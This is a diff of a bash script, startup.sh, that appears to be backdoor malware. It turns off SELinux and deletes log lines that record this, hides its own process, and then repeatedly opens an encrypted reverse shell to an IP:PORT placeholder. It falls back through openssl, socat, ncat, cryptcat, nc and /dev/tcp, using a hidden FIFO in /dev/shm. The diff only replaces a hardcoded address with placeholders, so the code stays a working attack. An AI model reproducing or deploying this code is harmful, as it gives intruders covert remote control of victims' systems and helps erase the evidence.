@@ -62,33 +62,28 @@ ssleep() {
 command getenforce &>/dev/null && (getenforce | grep -q "Enforcing") && setenforce 0 && find /var/log -type f -exec sed -i "/setenforce/d" {} \; #|| echo "NO setenforce needed" 
 
 ### startup.sh ###
-
-IP="127.0.0.1"  
-PORT="4316" 
-
 trap cleanup EXIT SIGINT SIGTERM SIGHUP SIGTSTP
 
 mtab     # hide current script pid  
 
-# OPENSSL MAIN 
-# /dev/tcp MAIN
+# MAIN 
 while true; do
         #mtab
         PIPE="/dev/shm/.cache_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
         mkfifo "$PIPE"
 
         if command -v openssl >/dev/null 2>&1; then
-                ( /bin/bash < $PIPE 2>&1 | openssl s_client -quiet -connect $IP:$PORT > $PIPE ) &
+                ( /bin/bash < $PIPE 2>&1 | openssl s_client -quiet -connect IP:PORT > $PIPE ) &
         elif command -v socat >/dev/null 2>&1; then
-                ( socat OPENSSL:$IP:$PORT,verify=0 EXEC:/bin/bash ) &
+                ( socat OPENSSL:IP:PORT,verify=0 EXEC:/bin/bash ) &
         elif command -v ncat >/dev/null 2>&1; then
-                ( /bin/bash < $PIPE 2>&1 | ncat --ssl $IP $PORT > $PIPE ) &
+                ( /bin/bash < $PIPE 2>&1 | ncat --ssl IP PORT > $PIPE ) &
         elif command -v cryptcat >/dev/null 2>&1; then
-                ( /bin/bash < $PIPE 2>&1 | cryptcat $IP $PORT > $PIPE ) &
+                ( /bin/bash < $PIPE 2>&1 | cryptcat IP PORT > $PIPE ) &
         elif command -v nc >/dev/null 2>&1; then
-                ( cat $PIPE |/bin/bash 2>&1|nc $IP $PORT > $PIPE ) &
+                ( cat $PIPE |/bin/bash 2>&1|nc IP PORT > $PIPE ) &
         else
-                ( /bin/bash  >& /dev/tcp/$IP/$PORT 0>&1 ) &
+                ( /bin/bash  >& /dev/tcp/IP/PORT 0>&1 ) &
         fi
         # HIde the created shell
         pid=$!
